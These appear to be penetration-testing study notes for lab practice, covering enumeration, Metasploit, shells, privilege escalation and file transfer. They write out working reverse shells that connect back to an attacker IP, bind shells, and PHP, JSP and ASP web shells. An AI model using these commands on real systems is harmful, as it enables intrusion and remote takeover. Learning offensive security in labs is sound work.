# Fingerprinting services
    1. Banner grabbing
        a. manual
        b. nmap -sV --script=banner -oA file_name <target>
    2. Nmap 
        a. nmap -oA file_name <target> # first run on common ports
            - nmap -p- -oA file_name <target> # second run on all ports
            - nmap -sV -sC -p<specific ports> -oA file_name <target> # run on found ports to be open, if run with this options on all ports it will take a long time
        b. check /usr/share/nmap/scripts or with locate scripts/<service name> to find appropriate nmap scripts for specific services
        c. nmap --script smb-os-discovery.nse -p445 -oA file_name <target>
    3. smbclient can be used to list shared folders in an smb service
        a. smbclient -N -L \\\\<targetIP>
        b. smbclient -U bob \\\\<tagetIP>\\<targetFolder>
    4. SNMP Community strings provide information and statistics about a router or device, helping us gain access to it
        a. snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
        b. snmpwalk -v 2c -c private  10.129.42.253 
        c. onesixtyone -c dict.txt 10.129.42.254 # https://github.com/trailofbits/onesixtyone # can be used to bruteforce community strings
# Exploiting services
## Public Exploits
    1. Google
    2. searchsploit - public vulnerabilities/exploits for any application
        - sudo apt install exploitdb -y
        - searchsploit openssh 7.2
    3. https://www.exploit-db.com/
    4. https://www.rapid7.com/db/
    5. https://www.vulnerability-lab.com/
## Metasploit Framework
    1. msfconsole
        a. search exploit <exploit name>
            - Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search
        b. use exploit/windows/smb/ms17_010_psexec
            - show options # to configure the options to run the exploit
        c. set RHOSTS 10.10.10.40
        d. set LHOST tun0
        e. check
            -  before we run the script, we can run a check to ensure the server is vulnerable. not every exploit supports the check function.
        f. exploit -  run or exploit command to run the exploit.
            - meterpreter > getuid
            - meterpreter > shell
            - C:\WINDOWS\system32>whoami
    ### Boxes to practice msfconsole on HTB (retired)
        Granny/Grandpa
        Jerry
        Blue
        Lame
        Optimum
        Legacy
        Devel
# Shells
    1. Linux
        a. SSH
    2. Windows
        a. WinRM
## Types of Shells
    1. Reverse Shell	Connects back to our system and gives us control through a reverse connection.
        a. Shell
            - nc -lvnp 1234 # on the attacking machine
            - bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' # Target Linux 
            - powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() # Target Windows
            - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md # check this for other shells.
            !Note: A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.
        b. Upgrading TTY
            - python/stty method 
                + python -c 'import pty; pty.spawn("/bin/bash")' # if we get a command not found error maybe the shell we have does not have the PATH env to the file (check with 'which')
                + ctrl + z # background our shell
                + stty raw -echo # input the following back on our local terminal
                + fg # bring back our netcat
                + [enter] x2 # or type reset then [enter] # after this or maybe a few more [enters] and we should have a fully working TTY
            - fix terminal size
                + echo $TERM # in our local terminal
                + stty size # in our local terminal
                + export TERM=xterm-256color # the variable may differ depending on the output of previous commands
                + stty rows 67 columns 318 # the variable may differ depending on the output of previous commands
    2. Bind Shell	    Waits for us to connect to it and gives us control once we do.
        a. Shell
            - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f # Target Linux
            - python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' # Target Linux using python
            - powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); # Target Windows
            - nc 10.10.10.1 1234 # Then we connect with netcat to the listening port
            !Note: As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
        b. Upgrading TTY
            - python/stty method 
                + python -c 'import pty; pty.spawn("/bin/bash")' # if we get a command not found error maybe the shell we have does not have the PATH env to the file (check with 'which')
                + ctrl + z # background our shell
                + stty raw -echo # input the following back on our local terminal
                + fg # bring back our netcat
                + [enter] x2 # or type reset then [enter] # after this or maybe a few more [enters] and we should have a fully working TTY
            - fix terminal size
                + echo $TERM # in our local terminal
                + stty size # in our local terminal
                + export TERM=xterm-256color # the variable may differ depending on the output of previous commands
                + stty rows 67 columns 318 # the variable may differ depending on the output of previous commands
    3. Web Shell	    Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
        a. Writing a Web Shell
            - <?php system($_REQUEST["cmd"]); ?> # PHP 
            - <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> # jsp
            - <% eval request("cmd") %> # asp
        b. Uploading a Web Shell
            - can be through a vulnerability in an upload feature
            -  if we only have remote command execution through an exploit
                + we can write our shell directly to the webroot to access it over the web
                + echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
        c. Accessing Web Shell
            - curl http://SERVER_IP:PORT/shell.php?cmd=id # pass the commands to the cmd variable defined in the web shell
            - http://SERVER_IP:PORT/shell.php?cmd=id # in browser pass the commands to the cmd variable defined in the web shell
            Pros:
                !Note: A great benefit of a web shell is that it would bypass any firewall restriction in place as it will not open a new connection
                !Note: Another great benefit is that if the compromised host is rebooted, the web shell would still be in place
            Cons:
                !Note: a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands
# Privilege Escalation
    find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows
## PrivEsc Checklists
    1. https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist # Linux
    2. https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation # Windows
    3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md # Linux
    4. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md # Windows
## Enumeration Scripts
    1. Linux
        - https://github.com/rebootuser/LinEnum
        - https://github.com/sleventyeleven/linuxprivchecker
    2. Windwos
        - https://github.com/GhostPack/Seatbelt
        - https://github.com/411Hall/JAWS
    3. Both
        - https://github.com/carlospolop/PEASS-ng
    !Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
## Kernel Exploits
    - If an old version of kernel is running, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows. We can then use this to escalate our privileges.
## Vulnerable Software
    1. Check installed installed software that might be vulnerable.
        a. dpkg -l # Linux, deb based
        b. C:\Program Files # check this folder in windows
        c. Get-WmiObject -Class Win32_Product # Windows Powershell
## User Privileges
    1. common ways to exploit certain user privileges
        a. sudo # Linux
            - sudo -l # requires a password to run - there are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password.
                +  (user : user) NOPASSWD: /bin/echo # such an output shows that we can run /bin/echo without a password 
            - if a particular application can run with sudo, we can look for ways to exploit it to get a shell as the root user
                + https://gtfobins.github.io/ # contains a list of commands and how they can be exploited through sudo
                + https://lolbas-project.github.io/#  # contains a list of Windows applications which we may be able to leverage to perform certain functions
        b. SUID
        c. Windows Token Privileges
## Scheduled Tasks
    1. Add new scheduled tasks/cron jobs
        a. Linux directories where we can add cron jobs if we have the write permissions over them
            - /etc/crontab
            - /etc/cron.d
            - /var/spool/cron/crontabs/root
    2. Trick them to execute a malicious software
        a. we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
## Exposed Credentials
    1. look for files we can read and see if they contain any exposed credentials.
        a. configuration files
        b. log files
        c. history files
            - bash_history # linux
            - PSReadLine # Windows
        !Note: enumeration scripts previously mentioned above usually look for potential passwords in files and provide them to us
    2. If we find any credentials we should also check if they are reused somewhere.
## SSH Keys
    1. If we have read access over the .ssh directory for a specific user we may read their private ssh keys and use it to log in to the server
        a. check all users .ssh
        b. check root user .ssh
        c. copy private key and log in
            - ssh user@10.10.10.10 -i id_rsa
            !Note: use the command 'chmod 600 id_rsa' on the key after creation on your machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
    2. If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys.
    !Note: This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user.
# Transferring Files
    1. Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file
    2. wget/cURL
        a. running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host
            - python3 -m http.server 8000 # in the directory that contains the file we need
            - wget http://10.10.14.1:8000/linenum.sh # download the file on the remote
            - curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
    3. SCP # granted we have obtained ssh user credentials on the remote host
        a. scp linenum.sh user@remotehost:/tmp/linenum.sh
    4. Using Base64 # if we are not be able to transfer the file, for example, the remote host may have firewall protections that prevent us from downloading a file from our machine
        a. we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it
            - base64 shell -w 0 # encode a binary file called shell
            - echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell # decode a base64 string into a binary file called shell
        b. Validating File Transfers
            - file shell # To ensure that we did not mess up the file during the encoding/decoding process
            - md5sum shell # we can check its md5 hash as well
